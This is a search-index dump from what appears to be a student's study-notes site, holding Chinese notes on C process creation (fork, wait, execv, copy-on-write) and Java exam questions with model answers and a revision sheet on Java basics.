\u8c03\u7528\u7684\u8fd4\u56de\u503c\uff1a</p> <ul> <li>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID (PID)\u3002</li> <li>\u5728\u5b50\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de 0\u3002</li> <li>\u5982\u679c fork() \u8c03\u7528\u5931\u8d25\uff0c\u5219\u8fd4\u56de -1\u3002</li> </ul> <p>\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u90fd\u4f1a\u6709\u4e00\u4e2a\u72ec\u7acb\u7684 pid\u3002</p> <p>fork() \u8c03\u7528\u4f1a\u5c1d\u8bd5\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u3002\u5982\u679c fork() \u5931\u8d25\uff08\u8fd4\u56de -1\uff09\uff0c\u7a0b\u5e8f\u4f1a\u6253\u5370 \u201cfork() failed\u201d \u5e76\u7ec8\u6b62\u3002</p> <p>\u5982\u679c fork() \u5728\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de 0\uff0c\u8fdb\u5165 case 0\u3002\u8fd9\u4e2a\u5757\u6253\u5370\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\uff0c\u5305\u62ec pid\u3001getpid() \u548c getppid()\uff0c\u5206\u522b\u662f\u5b50\u8fdb\u7a0b\u81ea\u5df1\u7684\u8fdb\u7a0b ID \u548c\u7236\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u56e0\u6b64\u4f1a\u8fdb\u5165 default\u3002\u7236\u8fdb\u7a0b\u4f1a\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u79d2\u949f\uff08sleep(1)\uff09\uff0c\u7136\u540e\u8f93\u51fa\u81ea\u8eab\u548c\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u9632\u6b62\u7236\u5b50\u540c\u65f6\u8fd0\u884c\u5bfc\u81f4\u4e00\u4e9b\u6df7\u4e71\u60c5\u51b5\u3002</p> <p>\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5e76\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u4e13\u95e8\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u8ba9\u7236\u8fdb\u7a0b\u80fd\u591f\u5728\u4e4b\u540e\u201c\u67e5\u627e\u201d\u6216\u201c\u67e5\u8be2\u201d\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u8fdb\u7a0b ID\uff09\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u4e0d\u4fdd\u5b58\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5b83\u5c06\u65e0\u6cd5\u901a\u8fc7\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\u6765\u91cd\u65b0\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684 PID\u3002</p> <p>\u5982\u679c\u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u7236\u8fdb\u7a0b\u4e22\u5931\u4e86\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u4f8b\u5982\u6ca1\u6709\u5b58\u50a8 PID\uff09\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6bd4\u5982 get_child_pid()\uff0c\u53ef\u4ee5\u8ba9\u7236\u8fdb\u7a0b\u7a0d\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u8fdb\u7a0b\u7684 PID\u3002\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u5f97\u5230\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5c31\u9700\u8981\u7236\u8fdb\u7a0b\u81ea\u5df1\u8d1f\u8d23\u8ddf\u8e2a\u8fd9\u4e2a PID\u3002</p> <p>\u7236\u8fdb\u7a0b\u5728 fork() \u4e4b\u540e\u5982\u4f55\u4e0e\u5b50\u8fdb\u7a0b\u4ea4\u4e92\uff1f</p> <ul> <li>wait() \u548c waitpid()\uff1a\u8fd9\u4e9b\u7cfb\u7edf\u8c03\u7528\u5141\u8bb8\u7236\u8fdb\u7a0b\u7b49\u5f85\u5176\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u5e76\u5728\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u65f6\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\u3002</li> </ul> <p>child \u4e5f\u53ef\u4ee5 call fork</p>"},{"location":"cs/c/5.2/#shell","title":"Shell","text":"<p>shell \u4f1a\u7b49\u5f85\u5176\u4e2d\u6240\u6709\u5b50\u8fdb\u7a0b\u7cfb\u7edf\u540a\u5f71\u7684\u5b8c\u6210\u518d\u6267\u884c\u4e0b\u4e00\u6b65\uff0c\u4ee5\u4e0b\u7a0b\u5e8f\u4eff\u771f\u4e86\u8fd9\u4e00\u70b9</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n#include  &lt;sys/wait.h&gt;\n\nvoid function(void)\n{\n    switch ( fork() ) {\n    case -1 :\n        printf(\"fork() failed\\n\"); // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                       // new child process\n        printf(\"child is pid=%i\\n\", getpid() );\n\n        for(int t=0 ; t&lt;3 ; ++t) {\n            printf(\"  tick\\n\");\n            sleep(1);\n        }\n        exit(EXIT_SUCCESS);\n        break;\n\n    default: {                    // original parent process\n        int child, status;\n\n        printf(\"parent waiting\\n\");\n        child = wait( &amp;status );\n\n        printf(\"process pid=%i terminated with exit status=%i\\n\",\n                child, WEXITSTATUS(status) );\n        exit(EXIT_SUCCESS);\n        break;\n    }\n\n    }\n}\n</code></pre>"},{"location":"cs/c/5.2/#_2","title":"\u7236\u5b50\u8fdb\u7a0b\u5185\u5b58","text":"<p>\u5f53 fork() \u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\uff0c\u5b50\u8fdb\u7a0b\u83b7\u5f97\u4e86\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u526f\u672c\uff0c\u5305\u62ec\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\u3002\u7236\u8fdb\u7a0b\u4f7f\u7528\u5b83\u539f\u6709\u7684\u5185\u5b58\uff0c\u800c\u5b50\u8fdb\u7a0b\u4f1a\u4f7f\u7528\u81ea\u5df1\u62f7\u8d1d\u5230\u7684\u5185\u5b58\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b50\u8fdb\u7a0b\u5728\u5f00\u59cb\u65f6\u6709\u4e00\u4efd\u4e0e\u7236\u8fdb\u7a0b\u76f8\u540c\u7684\u5185\u5b58\u526f\u672c\u3002</p> <p>\u4f20\u7edf\u89c2\u5ff5\u662f\u7236\u8fdb\u7a0b\u8c03\u7528 fork() \u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u4e3a\u5b50\u8fdb\u7a0b\u521b\u5efa\u4e00\u4efd\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u5b8c\u6574\u526f\u672c\u3002\u7136\u800c\uff0c\u8fd9\u6837\u505a\u6548\u7387\u975e\u5e38\u4f4e\uff0c\u56e0\u4e3a\u5927\u90e8\u5206\u65f6\u5019\uff0c\u5b50\u8fdb\u7a0b\u53ef\u80fd\u5e76\u4e0d\u4f1a\u5bf9\u5927\u90e8\u5206\u5185\u5b58\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u4e3a\u4e86\u4f18\u5316\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u4e86 \u5199\u65f6\u590d\u5236 (Copy-on-Write, COW) \u7684\u673a\u5236\u3002\u8fd9\u79cd\u673a\u5236\u4e0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u4f1a\u7acb\u5373\u4e3a\u5b50\u8fdb\u7a0b\u590d\u5236\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u53ea\u6709\u5728\u771f\u6b63\u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u590d\u5236\u3002\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <p>\u5199\u65f6\u590d\u5236\u7684\u673a\u5236\u4f18\u5316\u4e86\u5185\u5b58\u7ba1\u7406\uff1a\u7236\u5b50\u8fdb\u7a0b\u53ea\u5728\u9700\u8981\u4fee\u6539\u6570\u636e\u65f6\uff0c\u624d\u4f1a\u771f\u6b63\u590d\u5236\u5185\u5b58\u3002\u8fd9\u51cf\u5c11\u4e86\u5185\u5b58\u5360\u7528\uff0c\u63d0\u5347\u4e86\u6548\u7387\u3002</p>"},{"location":"cs/c/5.2/#shell_1","title":"shell \u52a0\u901f","text":"<p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nchar *program_arguments[] = {\n    \"ls\",       // \u6267\u884c\u7684\u7a0b\u5e8f\u540d\n    \"-l\",       // \u53c2\u65701\uff1a\u5217\u51fa\u6587\u4ef6\u8be6\u7ec6\u4fe1\u606f\n    \"-F\",       // \u53c2\u65702\uff1a\u9644\u52a0\u6587\u4ef6\u7c7b\u578b\n    NULL        // \u53c2\u6570\u5fc5\u987b\u4ee5 NULL \u7ed3\u675f\n};\n\nint main() {\n    execv(\"/bin/ls\", program_arguments);  // \u8c03\u7528 execv() \u8fd0\u884c ls \u547d\u4ee4\n\n    // \u5982\u679c execv \u6210\u529f\u8fd0\u884c\uff0c\u4e0b\u9762\u8fd9\u884c\u4ee3\u7801\u4e0d\u4f1a\u88ab\u6267\u884c\n    perror(\"execv failed\");               // \u5982\u679c execv \u5931\u8d25\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5b50\u8fdb\u7a0b\u4f1a\u8fd0\u884c execv()\uff0c\u7528\u65b0\u7684\u7a0b\u5e8f /bin/ls \u66ff\u6362\u5b83\u7684\u5185\u5b58\u3002\u8fd9\u610f\u5473\u7740\u5b83\u5c06\u6267\u884c ls -l -F \u547d\u4ee4\u3002\u6210\u529f\u540e\uff0c\u5f53\u524d\u8fdb\u7a0b\u7684\u4ee3\u7801\u5c31\u5b8c\u5168\u88ab\u65b0\u7684 ls \u7a0b\u5e8f\u4ee3\u7801\u66ff\u4ee3\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u7684\u534f\u4f5c\u4e2d\uff0c\u901a\u5e38\u7684\u505a\u6cd5\u662f\uff1a</p> <p>\u7236\u8fdb\u7a0b\u7ee7\u7eed\u6267\u884c\u5b83\u81ea\u5df1\u7684\u4efb\u52a1\u3002</p> <p>\u5b50\u8fdb\u7a0b\u4f7f\u7528 execv() \u6216\u5176\u4ed6\u7c7b\u4f3c\u7684 exec \u7cfb\u5217\u51fd\u6570\u6765\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\u3002</p> <p>\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 wait() \u7b49\u65b9\u5f0f\u7b49\u5f85\u5b50\u8fdb\u7a0b\u5b8c\u6210\u3002</p>"},{"location":"cs/c/5.2/#conclusion","title":"Conclusion","text":"<p>\u76ee\u7684\uff1afork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\u540e\uff0cexecv() \u8ba9\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u8fd0\u884c\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u884c\u4e3a\uff1a\u5b50\u8fdb\u7a0b\u7684\u5185\u5b58\u4f1a\u88ab\u65b0\u7a0b\u5e8f\u66ff\u4ee3\uff0c\u56e0\u6b64\u5b83\u53d8\u6210\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u91cd\u8981\u6027\uff1a\u5728\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u901a\u5e38\u4e0d\u4f1a\u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u6240\u4ee5\u9700\u8981 execv() \u8fd9\u6837\u7684\u673a\u5236\u6765\u8fd0\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\u3002</p> <p>\u4ee5\u53ca shell \u914d\u5408 c \u8bed\u8a00\u4e00\u8d77\u8fd0\u884c\u7684\u65f6\u5019\u53c2\u6570\u4e00\u8d77\u5de5\u4f5c\u7684\u65b9\u5f0f\u5f88\u91cd\u8981</p> <p>./status 0 &amp;&amp; ./status 1</p> <p>./status 1 &amp;&amp; ./status 0</p> <p>./status 0 || ./status 1</p> <p>./status 1 || ./status 0</p> <ul> <li><code>&amp;&amp;</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u6210\u529f\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li><code>||</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u5931\u8d25\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li>\u9000\u51fa\u72b6\u6001\u7801 <code>0</code> \u901a\u5e38\u8868\u793a\u6210\u529f\uff0c\u975e <code>0</code> \u8868\u793a\u5931\u8d25\u3002</li> </ul>"},{"location":"cs/java/basics/2024.s1/","title":"2024.S1","text":""},{"location":"cs/java/basics/2024.s1/#question-1","title":"Question 1","text":"<p>A palindrome is a string that is the same backwards as forwards. For example, \"racecar\" is a palindrome, because after reversing the characters it still reads \"racecar\" whereas \"word\" is not because after reversing the characters it becomes a different string, \"drow\".</p> <p>A substring of a string is any chunk of characters starting at some index and running for some length. For example, \"TS20\" is a substring of \"CITS2005\" starting at index 2 and of length 4.</p> <p>Write a class PalindromeCounter. The class should have a static method <code>int numPals(String string, int length)</code> that returns the number of substrings of string of length <code>length</code> that are palindromes. The class should have an overload of <code>numPals</code> that takes only the String parameter and returns the number of substrings of length greater than 1 that are palindromes. The efficiency of your algorithm is not important, but for full marks, you should avoid repeating code unnecessarily.</p> <p>For example, <code>numPals(\"banana\", 3)</code> should return 3, since \"ana\", \"nan\", and \"ana\" are all palindromes of length 3, and <code>numPals(\"racecar\")</code> should return 3 because \"cec\", \"aceca\", and \"racecar\" are all palindromes.</p> <p>Hint: Recall that String has a <code>.charAt(i)</code> method that gets the character at a specific index, and that it also has a <code>.length()</code> method that returns the number of characters in the string.</p> <p>Answer:</p> <pre><code>class PalindromeCounter {\n    private static boolean isPalindrome(String s, int start, int end) {\n        while (start &lt; end) {\n            if (s.charAt(start) != s.charAt(end)) \n                return false;\n            start++;\n            end--;\n        }\n        return true;\n    }\n\n    public static int numPals(String str, int len) {\n        int count = 0;\n        for (int i = 0; i &lt;= str.length() - len; i++) {\n            if (isPalindrome(str, i, i + len - 1)) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    public static int numPals(String str) {\n        int total = 0;\n        for (int len = 2; len &lt;= str.length(); len++) {\n            total += numPals(str, len);\n        }\n        return total;\n    }\n}\n</code></pre> <p>Explanation: A palindrome is a string that reads the same forward and backward. The solution uses:</p> <ol> <li><code>isPalindrome</code> helper method that checks characters from both ends moving inward</li> <li><code>numPals(String, int)</code> counts palindromic substrings of given length by sliding a window</li> <li><code>numPals(String)</code> sums counts for all lengths \u22652 by calling the first method The algorithm efficiently reuses code and handles all cases correctly.</li> </ol>"},{"location":"cs/java/basics/2024.s1/#question-2","title":"Question 2","text":"<p>Give a brief description of what abstract classes are and how they relate to the concept of inheritance in Java. Provide a short (\u2264 20 lines) code example showing a use of one or more abstract classes where it would not be possible to use interfaces instead, and explain why.</p> <p>Answer: Abstract classes:</p> <ul> <li>Define common structure/behavior for subclasses</li> <li>Can contain abstract methods (no implementation) and concrete methods</li> <li>Support code reuse through inheritance</li> <li>Cannot be instantiated directly</li> </ul> <p>Example: <pre><code>abstract class Animal {\n    private String name;\n    public Animal(String name) { this.name = name; }\n    public abstract void makeSound();\n    public String getName() { return name; }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) { super(name); }\n    public void makeSound() { System.out.println(\"Woof\"); }\n}\n</code></pre></p> <p>Explanation:  Abstract classes are needed when: 1. Requiring fields (like <code>name</code>)  2. Needing constructors to initialize state 3. Sharing common implementation (like <code>getName()</code>) Interfaces can't have instance fields or constructors, making abstract classes essential for stateful hierarchies.</p>"},{"location":"cs/java/basics/2024.s1/#question-3","title":"Question 3","text":"<p>Give a brief description of what interfaces are and how they relate to the concept of polymorphism in Java. Provide a short (\u2264 20 lines) code example showing a use of one or more interfaces where it would not be possible to use abstract classes instead, and explain why.</p> <p>Answer: Interfaces:</p> <ul> <li>Define contracts (method signatures) without implementation</li> <li>Enable polymorphism - different classes can be treated uniformly</li> <li>Support multiple inheritance of types</li> </ul> <p>Example: <pre><code>interface Drawable {\n    void draw();\n}\n\nclass Circle implements Drawable {\n    public void draw() { /* draw circle */ }\n}\n\nclass Square implements Drawable {\n    public void draw() { /* draw square */ }\n}\n</code></pre></p> <p>Explanation:  Interfaces are essential when: 1. Unrelated classes need to share behavior 2. Multiple behaviors need to be combined 3. Decoupling implementation from contract Abstract classes can't support multiple inheritance, while interfaces allow classes to implement multiple interfaces.</p>"},{"location":"cs/java/basics/2024.s1/#question-4","title":"Question 4","text":"<p>Recall that Java Strings are immutable, meaning their values cannot change. Explain how, then, the following method is able to modify the contents of the words array such that the contents of words is different when it is returned from when it was constructed.</p> <pre><code>public static String[] mystery() {\n    String[] words = {\"these\", \"words\", \"change\"};\n    words[2] = words[0] + words[1];\n    words[1] = words[0];\n    return words;\n}\n</code></pre> <p>Answer: The method modifies the array's element references, not the String contents. Specifically:</p> <ol> <li><code>words[2] = words[0] + words[1]</code> creates a new String and changes array reference</li> <li><code>words[1] = words[0]</code> copies reference to first element</li> <li>Strings themselves remain immutable - only references change</li> </ol> <p>Explanation:  Java Strings are immutable, meaning their character data can't change after creation. However: - Array elements are references to objects - Reassigning array elements changes what objects they reference - The original Strings \"words\" and \"change\" remain unmodified</p>"},{"location":"cs/java/basics/2024.s1/#question-5","title":"Question 5","text":"<p>The DigitHistogram class below stores a count of how many copies it \"contains\" of each digit 0 through 9. It provides methods for inserting or deleting one digit at a time. Overload the delete method in the DigitHistogram class to take an array of ints as a parameter instead of a single int. The new method, when called as <code>hist.delete(arr)</code>, should delete from <code>hist</code> each digit that appears in <code>arr</code>. If the same digit appears multiple times in the array, one copy of it should be deleted for each time it appears (without taking the count below zero). The method should return the number of elements successfully deleted. If any of the elements in the array are not a valid digit, the method should throw an <code>IllegalArgumentException</code> and not modify the contents of the histogram.</p> <pre><code>public class DigitHistogram {\n    private int[] counts;\n\n    public DigitHistogram() {\n        counts = new int[10];\n    }\n\n    public void insert(int digit) throws IllegalArgumentException {\n        if (digit &lt; 0 || 9 &lt; digit) {\n            throw new IllegalArgumentException();\n        }\n        counts[digit] += 1;\n    }\n\n    // Returns true if the digit existed and was\n    // successfully removed and false otherwise\n    public boolean delete(int digit) throws IllegalArgumentException {\n        if (digit &lt; 0 || 9 &lt; digit) {\n            throw new IllegalArgumentException();\n        }\n        if (counts[digit] &gt; 0) {\n            counts[digit] -= 1;\n            return true;\n        }\n        return false;\n    }\n}\n</code></pre> <p>Answer: <pre><code>public int delete(int[] digits) throws IllegalArgumentException {\n    // Validate all digits first\n    for (int digit : digits) {\n        if (digit &lt; 0 || digit &gt; 9) {\n            throw new IllegalArgumentException();\n        }\n    }\n\n    int count = 0;\n    for (int digit : digits) {\n        if (counts[digit] &gt; 0) {\n            counts[digit]--;\n            count++;\n        }\n    }\n    return count;\n}\n</code></pre></p> <p>Explanation: 1. First validate all digits - throw if any invalid 2. Iterate through digits array:    - For each digit, decrement count if &gt;0    - Track successful deletions 3. Return total successful deletions Key points:  - Validation before modification ensures atomicity - No count goes below zero - Returns actual number of deletions</p>"},{"location":"cs/java/basics/2024.s1/#question-6","title":"Question 6","text":"<p>Describe the concept of deadlock and explain how the behaviour of the synchronized keyword in Java could lead to a deadlock. Your answer does not need to include example code, but may if you think it helps communicate the idea.</p> <p>Answer: Deadlock occurs when threads wait indefinitely for resources held by each other. Synchronized keyword can cause deadlock by:</p> <ol> <li>Requiring threads to acquire locks on objects</li> <li>Creating circular wait dependencies between threads Example: Thread1 locks A then needs B, while Thread2 locks B then needs A.</li> </ol> <p>Explanation: Synchronized blocks/methods: - Provide mutual exclusion for shared resources - Can lead to deadlock when:   a) Threads acquire locks in different orders   b) No preemption of locks   c) Circular wait conditions form   Prevention: always acquire locks in consistent order.</p>"},{"location":"cs/java/basics/2024.s1/#question-7","title":"Question 7","text":"<p>The following interface represents any type that can be incremented. For example, integers can be incremented by adding 1, such that incrementing 4 gives 5. In this question, assume that to increment something is to increase it by the smallest amount possible. Create an EvenInteger class that can only be used to hold non-negative (\u2265 0) even integers. This class should implement Incrementable. It should have a constructor that initializes the value to zero, and a public getter method to retrieve the value. Incrementing an even number should increase it to the next largest even number.</p> <pre><code>interface Incrementable {\n    void increment();\n}\n</code></pre> <p>Answer: <pre><code>class EvenInteger implements Incrementable {\n    private int value;\n\n    public EvenInteger() {\n        value = 0;\n    }\n\n    public int getValue() {\n        return value;\n    }\n\n    public void increment() {\n        // Ensure non-negative and even\n        if (value &lt; 0 || value % 2 != 0) {\n            throw new IllegalStateException();\n        }\n        // Handle overflow\n        if (value &gt; Integer.MAX_VALUE - 2) {\n            throw new ArithmeticException(\"Overflow\");\n        }\n        value += 2;\n    }\n}\n</code></pre></p> <p>Explanation: The EvenInteger class: 1. Starts at 0 (even, non-negative)</p> <ol> <li> <p>Only allows even values via controlled increment (+2)</p> </li> <li> <p>Prevents negative values and overflow</p> </li> <li> <p>Implements Incrementable interface</p> </li> </ol> <p>Key points: - Constructor ensures valid initial state - Increment maintains evenness - Validation prevents invalid states</p>"},{"location":"cs/java/basics/concept/","title":"Open Book Exam","text":""},{"location":"cs/java/basics/concept/#1-java-basics","title":"1. Java Basics","text":""},{"location":"cs/java/basics/concept/#11-the-main-method","title":"1.1. The <code>main</code> Method","text":"<p>The <code>main</code> method is the entry point of any Java application. - Signature: <code>public static void main(String[] args)</code>   - <code>public</code>: Access modifier, makes it globally available.   - <code>static</code>: Allows the method to be called without creating an object of the class. The JVM calls <code>main</code> before any objects are made.   - <code>void</code>: Indicates that the <code>main</code> method does not return any value.   - <code>String[] args</code>: An array of <code>String</code> type that stores command-line arguments.</p>"},{"location":"cs/java/basics/concept/#12-data-types","title":"1.2. Data Types","text":"<p>Java has two categories of data types:</p> Feature Primitive Types Reference Types Definition Predefined, basic data types. Refer to objects or <code>null</code>. Storage Store actual values. Store memory addresses of objects. Examples <code>byte</code>, <code>short</code>, <code>int</code>, <code>long</code>, <code>float</code>, <code>double</code>, <code>char</code>, <code>boolean</code> Classes, Interfaces, Arrays, Enums, <code>String</code> Default Value Numeric: <code>0</code>, <code>boolean</code>: <code>false</code>, <code>char</code>: <code>\\u0000</code> <code>null</code> Memory Stack (for local variables) Heap (for objects), Stack (for references) <p>Example: <pre><code>public class DataTypesExample {\n    public static void main(String[] args) {\n        // Primitive type\n        int age = 30; // Stored directly\n        System.out.println(\"Age: \" + age);\n\n        // Reference type\n        String name = \"Java\"; // 'name' holds address of \"Java\" object\n        System.out.println(\"Name: \" + name);\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#13-final-keyword","title":"1.3. <code>final</code> Keyword","text":"<p>The <code>final</code> keyword is used to restrict modification. It can be applied to variables, methods, and classes.</p> Applied to Effect Example Variable Value cannot be changed once assigned (constant). For reference variables, the reference cannot be changed, but the object's state can. <code>final int MAX_VALUE = 100;</code> <code>final MyObject obj = new MyObject();</code> Method Cannot be overridden by subclasses. <code>class A { final void display() {} }</code> Class Cannot be subclassed (inherited from). <code>final class FinalClass {}</code> <p>Key points: - A <code>final</code> variable must be initialized at the time of declaration or in the constructor (if it's an instance variable).</p>"},{"location":"cs/java/basics/concept/#14-static-keyword","title":"1.4. <code>static</code> Keyword","text":"<p>The <code>static</code> keyword indicates that a member belongs to the class itself, rather than to instances of the class.</p> Applied to Effect Notes Variable Class variable; shared among all instances. Only one copy exists. Initialized when class is loaded. Method Class method; can be called using <code>ClassName.methodName()</code>. Can only access static members directly. Cannot use <code>this</code> or <code>super</code>. Often used for utility functions. <code>main</code> method is static. Block Static initialization block; executed once when the class is loaded. Used for initializing static variables. Nested Class A static nested class can access static members of the outer class. It does not have access to instance members of the outer class. Behaves like a top-level class but is packaged within another class. <p>Example: <pre><code>class Counter {\n    static int count = 0; // Static variable\n    Counter() { count++; }\n\n    static void displayCount() { // Static method\n        System.out.println(\"Count: \" + count);\n    }\n    public static void main(String[] args) {\n        new Counter(); new Counter();\n        Counter.displayCount(); // Outputs: Count: 2\n    }\n}\n</code></pre></p>"},{"location":"cs/java/basics/concept/#15-scope-of-variables","title":"1.5. Scope of Variables","text":"<p>Scope refers to the region of a program where a variable is accessible.</p> Scope Type Definition Lifetime Member Variable (Instance) Declared inside a class but outside any method. Belongs to an instance. As long as the object exists in memory. Static Variable (Class) Declared with <code>static</code> keyword. Belongs to the class. As long as the class is loaded in memory. Local Variable Declared inside a method, constructor, or block. Only within that method, constructor, or block. Block Variable Declared inside a specific block of code (e.g., within <code>{}</code>). Only within that block."},{"location":"cs/java/basics/concept/#16-type-casting","title":"1.6. Type Casting","text":"<p>Converting a value from one data type to another.</p> <ol> <li>Widening Casting (Implicit):<ul> <li>Converting a smaller type to a larger type size (<code>byte -&gt; short -&gt; char -&gt; int -&gt; long -&gt; float -&gt; double</code>).</li> <li>Automatic, no data loss. Example: <code>int i = 100; long l = i;</code></li> </ul> </li> <li>Narrowing Casting (Explicit):<ul> <li>Converting a larger type to a smaller size type (<code>double -&gt; float -&gt; long -&gt; int -&gt; char -&gt; short -&gt; byte</code>).</li> <li>Manual, requires explicit cast, potential data loss. Example: <code>double d = 100.04; int i = (int)d; // i is 100</code></li> </ul> </li> </ol> <p>// End of Section 1.6 Type Casting</p>"},{"location":"cs/java/basics/concept/#17-basic-array-operations","title":"1.7. Basic Array Operations","text":"<p>Arrays are fixed-size, ordered collections of elements of the same type. They are a fundamental data structure in Java.</p> <p>Declaration and Initialization: <pre><code>// Declaration\nint[] numbers;\nString[] names;\n\n// Initialization with size (elements get default values: 0 for int, null for String)\nnumbers = new int[5]; // Array of 5 integers\nString[] messages = new String[3]; // Array of 3 Strings\n\n// Initialization with values\nnames = new String[]{\"Alice\", \"Bob\", \"Charlie\"}; // Using new\nint[] scores = {10, 20, 30}; // Shorthand initialization\n</code></pre></p> 